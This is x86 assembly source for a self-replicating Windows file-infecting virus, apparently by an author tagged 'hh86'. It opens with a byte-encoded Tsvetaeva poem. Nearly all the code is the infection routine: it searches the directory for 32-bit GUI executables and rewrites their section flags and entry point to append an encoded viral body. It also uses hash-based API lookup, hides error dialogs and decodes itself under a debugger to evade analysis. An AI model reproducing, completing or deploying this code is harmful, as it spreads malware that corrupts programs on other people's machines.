.386
.model  flat, stdcall
include atlas.inc
.code
link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh, 4dh
        db      61h, 72h, 69h, 6eh
        db      61h, 20h, 54h, 73h
        db      76h, 65h, 74h, 61h
        db      65h, 76h, 61h, 20h
        db      28h, 31h, 39h, 31h
        db      36h, 29h, 0ah, 0dh

text_end        label    near
        pop     eax
        xor     ebx, ebx
        push    ebx
        push    860h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    eax
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

assume fs:nothing

code_debug      label    near

;-------------------------------------------------------------------------------
;encode replication body
;-------------------------------------------------------------------------------

        mov     esi, offset bodysrc1
        mov     ecx, offset bodysrc2 - offset bodysrc1
        mov     edi, offset bodyref1

encode_code     label    near
        inc     edi
        xor     eax, eax
        lods    byte ptr [esi]
        mov     edx, (offset bodyref1 + ((offset bodysrc2 - offset bodysrc1) * 5) + (offset bodyreff - offset bodyrefr)) - 4
        sub     edx, edi
        add     eax, edx
        stos    dword ptr [edi]
        loop    encode_code
        mov     byte ptr [esi + (offset bodyref3 - offset code_begin) - 1], (offset object_name - offset object_hdr) shr 1
        push    offset link_text
        jmp     code_pushoff

bodysrc1        label    near

;-------------------------------------------------------------------------------
;replication body
;-------------------------------------------------------------------------------

        mov     ah, 20h
        sub     esp, eax
        push    "*"
        mov     esi, esp
        push    esi
        push    esi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kFindFirstFileA - 4]
        xchg    edi, eax

map_file        label    near

;-------------------------------------------------------------------------------
;map file if possible
;-------------------------------------------------------------------------------

        push    dword ptr [esi + WIN32_FIND_DATA.dwFileAttributes]
        lea     ecx, dword ptr [esi + low WIN32_FIND_DATA.cFileName]
        push    ecx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kSetFileAttributesA - 4]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCreateFileA - 4]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [ebp + mapStackAPIK32.kCreateFileMappingA]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kMapViewOfFile - 4]
        push    eax
        pushad
        call    infect_exe

delta_mapseh    label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kUnmapViewOfFile - 4]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCloseHandle - 4]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCloseHandle - 4]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kSetFileAttributesA - 4]
        push    esi
        push    edi
        call    dword ptr [ebp + mapStackAPIK32.kFindNextFileA]
        test    eax, eax
        jnz     map_file
        push    edi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kFindClose - 4]

breakpoint      label    near
        int     3

infect_exe      label    near

;-------------------------------------------------------------------------------
;test file contents
;signatures must match those of PE exe files
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     breakpoint
        mov     edi, eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER_E_LFANEW]
        cmp     dword ptr [eax], "EP"
        jne     breakpoint

;-------------------------------------------------------------------------------
;32-bit machine
;discard DLL files (because they do not have own PEB) and system files
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_MACHINE], IMAGE_FILE_MACHINE_I386
        jne     breakpoint
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_CHARACTERISTICS]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        jz      breakpoint
        test    ch, high (IMAGE_FILE_DLL or IMAGE_FILE_SYSTEM)
        jnz     breakpoint

;-------------------------------------------------------------------------------
;before check size of optional header make sure optional header is PE32
;IMAGE_NT_OPTIONAL_HDR_MAGIC must be PE32 structure (not ROM, not 64-bit)
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     breakpoint

;-------------------------------------------------------------------------------
;standard SizeOfOptionalHeader
;-------------------------------------------------------------------------------

        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        cmp     dx, 0e0h
        jne     breakpoint

;-------------------------------------------------------------------------------
;no config table, because it might contain SafeSEH
;-------------------------------------------------------------------------------

        cmp     dword ptr [eax + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE], ebx
        jne     breakpoint

skip_ldcchk     label    near

;-------------------------------------------------------------------------------
;Windows GUI subsystem file only
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_SUBSYSTEM], IMAGE_SUBSYSTEM_WINDOWS_GUI
        jne     breakpoint

;-------------------------------------------------------------------------------
;reloc place
;-------------------------------------------------------------------------------

        imul    cx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_NUMBER_OF_SECTIONS], IMAGE_SECTION_HEADER_SIZEOF
        lea     esi, dword ptr [eax + edx + (IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC - IMAGE_SECTION_HEADER_SIZEOF) + IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS]
        add     esi, ecx
        mov     edx, dword ptr [esi]
        mov     bl, IMAGE_DIRECTORY_ENTRY_RELOC_TABLE
        add     ebx, eax
        cmp     dword ptr [ebx], edx
        jne     breakpoint
        cmp     dword ptr [ebx + 4], offset bodyref2 - offset code_begin
        jb      breakpoint
        add     edi, dword ptr [esi + (IMAGE_SECTION_HEADER_POINTER_TO_RAW_DATA - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS)]

;-------------------------------------------------------------------------------
;unset *_NX_COMPAT below and you might not need IMAGE_SCN_MEM_EXECUTE in section flags
;-------------------------------------------------------------------------------

        or      byte ptr [esi + (IMAGE_SECTION_HEADER_CHARACTERISTICS - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS) + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

;-------------------------------------------------------------------------------
;copy body
;-------------------------------------------------------------------------------

        push    edi
        mov     esi, dword ptr [esp + mapSEH.pExceptionHandler + 4]
        sub     esi, (offset delta_mapseh - offset bodysrc1) + (offset bodylane - offset code_begin)
        mov     cx, offset bodylane - offset code_begin
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     cx, offset bodysrc2 - offset bodysrc1
        add     esi, ecx
        rep     stos byte ptr [edi]
        mov     cx, offset bodyref2 - offset bodyref1
        rep     movs byte ptr [edi], byte ptr [esi]

;-------------------------------------------------------------------------------
;unset *_NO_SEH and *_FORCE_INTEGRITY flags from DllCharacteristics
;clean up reloc data directory entries
;-------------------------------------------------------------------------------

        and     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics], not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY)
        mov     dword ptr [ebx], ecx
        mov     dword ptr [ebx + 4], ecx

;-------------------------------------------------------------------------------
;redirect entrypoint
;-------------------------------------------------------------------------------

        pop     edi
        xchg    dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], edx
        mov     dword ptr [edi + (offset code_pushoff - offset code_begin) - 4], edx
        int     3
bodysrc2        label    near

code_begin      label    near

;-------------------------------------------------------------------------------
;begin here in infected files
;-------------------------------------------------------------------------------

        push    dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp], "hh86"      ;replaced by entrypoint

code_pushoff    label    near
        pushad
        call    code_mainseh

delta_mnseh     label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret

code_mainseh    label    near
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      0d8e77e49h                   ;ContinueDebugEvent
        dd      0553b5c78h                   ;CreateFileA
        dd      0b41b926ch                   ;CreateFileMappingA
        dd      0a851d916h                   ;CreateProcessA
        dd      0d82bf69ah                   ;FindClose
        dd      0c9ebd5ceh                   ;FindFirstFileA
        dd      075272948h                   ;FindNextFileA
        dd      0d2e536b7h                   ;GetLastError
        dd      0649eb9c1h                   ;GetThreadContext
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      0a89b382fh                   ;MapViewOfFile
        dd      0f7c7ae42h                   ;ReadProcessMemory
        dd      0839a7905h                   ;SetErrorMode
        dd      0156b9702h                   ;SetFileAttributesA
        dd      05688cbd8h                   ;SetThreadContext
        dd      0391ab6afh                   ;UnmapViewOfFile
        dd      096ab83a1h                   ;WaitForDebugEvent
        dd      0cce95612h                   ;WriteFile
        dd      04f58972eh                   ;WriteProcessMemory

object_hdr      label    near
        db      "M",                                IMAGE_DOS_HEADER.e_magic
        db      "Z",                                IMAGE_DOS_HEADER.e_magic + 1
        db      "P",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature
        db      "E",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature + 1
        db      low IMAGE_FILE_MACHINE_I386,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine
        db      high IMAGE_FILE_MACHINE_I386,       IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine + 1
        db      1,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        db      60h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Characteristics
        db      low IMAGE_NT_OPTIONAL_HDR32_MAGIC,  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic
        db      high IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + 1
        db      0ch,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.BaseOfData
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.ImageBase + 2
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.FileAlignment + 1
        db      4,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.MajorSubsystemVersion
        db      20h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders + 1
        db      IMAGE_SUBSYSTEM_WINDOWS_GUI,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Subsystem
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Misc.VirtualSize + 79h
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.VirtualAddress + 79h
        db      20h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Characteristics + 7bh

object_name     label    near

;-------------------------------------------------------------------------------
;debugee file name
;-------------------------------------------------------------------------------

        db      "hh86.exe", 0

walk_dll        label    near

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER_E_LFANEW]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER_E_LFANEW shl 1]

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAMES]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAME_ORDINALS]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_FUNCTIONS]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        cmp     al, 2eh
        jne     walk_names

;-------------------------------------------------------------------------------
;hide error messages
;-------------------------------------------------------------------------------

        mov     ebp, esp
        mov     ebx, ecx
        mov     ch, high debugObjectFileSize
        push    ecx
        push    ecx
        push    GMEM_ZEROINIT
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kGlobalAlloc - 4]
        mov     byte ptr [eax], al
        xchg    edi, eax
        push    SEM_FAILCRITICALERRORS or SEM_NOALIGNMENTFAULTEXCEPT or SEM_NOGPFAULTERRORBOX or SEM_NOOPENFILEERRORBOX
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kSetErrorMode - 4]
        pop     ecx
        push    edi
        push    eax
        pushad
        call    init_sncseh
        pop     eax
        pop     eax
        pop     esp
        pop     dword ptr fs:[ebx]
        pop     eax
        popad
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kSetErrorMode]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kGlobalFree]

global_non      label    near
        int     3

init_sncseh     label    near

;-------------------------------------------------------------------------------
;initialise file object
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        push    ebx
        push    esp
        push    ecx
        push    edi
        push    ebx
        push    ebx
        push    CREATE_ALWAYS
        push    ebx
        push    ebx
        push    3
        cdq
        push    "h"

bodyref3        label    near
        pop     ecx

expand_hdr      label    near
        lods    word ptr [esi]
        mov     dl, ah
        mov     byte ptr [edi + edx], al
        loop    expand_hdr
        push    esi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCreateFileA - 4]
        push    eax
        xchg    edi, eax
        call    dword ptr [ebp + mapStackAPIK32.kWriteFile]
        push    edi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCloseHandle - 4]
        mov     ecx, ebx
        mov     ch, high ((((sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + sizeof mapStores + sizeof CONTEXT + (100h - 1)) / 100h) * 100h))

nullify         label    near
        push    ebx
        loop    nullify
        xchg    eax, esi
        mov     esi, esp
        lea     edx, dword ptr [eax + (offset bodylane - offset object_name)]
        mov     dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + mapStores.bodyStore1], edx
        add     edx, offset bodyref1 - offset bodylane
        mov     dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + mapStores.bodyStore2], edx
        lea     edi, dword ptr [esi + sizeof PROCESS_INFORMATION2]
        push    esi
        push    esi
        push    ebx
        push    ebx
        push    DEBUG_PROCESS
        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    eax
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCreateProcessA - 4]
        dec     eax
        jnz     debug_exit
        pushad
        call    debug_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        lods    dword ptr [esi]
        push    eax
        lods    dword ptr [esi]
        push    eax
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCloseHandle - 4]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kCloseHandle - 4]

debug_exit      label    near
        int     3

debug_seh       label    near
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp

debug_event     label    near

;-------------------------------------------------------------------------------
;process debug event exceptions
;if exception is no breakpoint, branch to shutdown
;if exception is not first time, branch to decryptor
;-------------------------------------------------------------------------------

        push    TIMEWAIT
        push    edi
        call    dword ptr [ebp + mapStackAPIK32.kWaitForDebugEvent]
        cmp     dword ptr [edi + DEBUG_EVENT.dwDebugEventCode], EXCEPTION_DEBUG_EVENT
        jne     debug_pass
        cmp     dword ptr [edi + DEBUG_EVENT.u.Exception.pExceptionRecord.ExceptionCode], EXCEPTION_BREAKPOINT
        jne     debug_excp
        cmp     byte ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + mapFlags.ExceptionFlag], bl
        jne     debug_stde

;-------------------------------------------------------------------------------
;copy encrypted body into process
;-------------------------------------------------------------------------------

        push    ebx
        push    esp
        push    offset bodyref2 - offset bodyref1
        push    dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + mapStores.bodyStore2]
        push    401000h
        push    dword ptr [esi + PROCESS_INFORMATION2.hProcess]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kWriteProcessMemory - 4]
        pop     eax
        inc     byte ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + mapFlags.ExceptionFlag]

debug_pass      label    near

;-------------------------------------------------------------------------------
;respond to event here
;-------------------------------------------------------------------------------

        push    DBG_CONTINUE

debug_pstk      label    near
        push    dword ptr [edi + DEBUG_EVENT.dwThreadId]
        push    dword ptr [edi + DEBUG_EVENT.dwProcessId]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kWriteFile + mapStackAPIK32.kContinueDebugEvent - 4]
        dec     eax
        jz      debug_event

;-------------------------------------------------------------------------------
;determine how many bytes were written into the buffer
;compare address of decoder buffer with encoded body address, if match, run results
;-------------------------------------------------------------------------------

        mov     eax, dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + mapStores.bodyStore1]
        sub     eax, dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + mapStores.bodyStore2]
        jz      bodylane
        int     3                            ;you were but a ghost in my arms

debug_stde      label    near
        pushad
        call    init_decode
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad

debug_excp      label    near

;-------------------------------------------------------------------------------
;do not handle exception (causes process to crash)
;this is shared code
;-------------------------------------------------------------------------------

        push    DBG_EXCEPTION_NOT_HANDLED
        jmp     debug_pstk

init_decode     label    near
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        lea     ecx, dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + sizeof mapStores]
        mov     dword ptr [ecx + CONTEXT.ContextFlags], CONTEXT_FULL
        mov     eax, dword ptr [esi + PROCESS_INFORMATION2.hThread]
        push    ecx
        push    eax
        push    ecx
        push    ecx
        push    eax
        call    dword ptr [ebp + mapStackAPIK32.kGetThreadContext]
        pop     ecx
        push    ebx
        mov     edx, esp
        push    ecx
        push    ebx
        push    esp
        push    sizeof CONTEXT.regEsp
        push    edx
        push    dword ptr [ecx + CONTEXT.regEsp]
        push    dword ptr [esi + PROCESS_INFORMATION2.hProcess]
        call    dword ptr [ebp + mapStackAPIK32.kReadProcessMemory]
        pop     eax
        pop     ecx
        pop     dword ptr [ecx + CONTEXT.regEip]
        mov     eax, dword ptr [edi + DEBUG_EVENT.u.Exception.pExceptionRecord.ExceptionAddress]
        sub     eax, 401000h + ((offset bodysrc2 - offset bodysrc1) * 5) + (offset bodyreff - offset bodyrefr)
        mov     edx, dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + mapStores.bodyStore1]
        mov     byte ptr [edx], al
        inc     dword ptr [esi + sizeof PROCESS_INFORMATION2 + sizeof DEBUG_EVENT + sizeof mapFlags + mapStores.bodyStore1]
        call    dword ptr [ebp + mapStackAPIK32.kSetThreadContext]
        pop     dword ptr fs:[ebx]
        pop     eax
        popad
        jmp     debug_pass

bodylane        label    near
        db      offset bodysrc2 - offset bodysrc1 dup (0)

bodyref1        label    near
        db      (offset bodysrc2 - offset bodysrc1) dup (CALL_OP)
        db      (offset bodysrc2 - offset bodysrc1) dup (CALL_OP)
        db      (offset bodysrc2 - offset bodysrc1) dup (CALL_OP)
        db      (offset bodysrc2 - offset bodysrc1) dup (CALL_OP)
        db      (offset bodysrc2 - offset bodysrc1) dup (CALL_OP)

bodyrefr        label    near
        push    0
        ret

bodyreff        label    near
        db      100h dup (INT3_OP)

bodyref2        label    near

end     code_debug
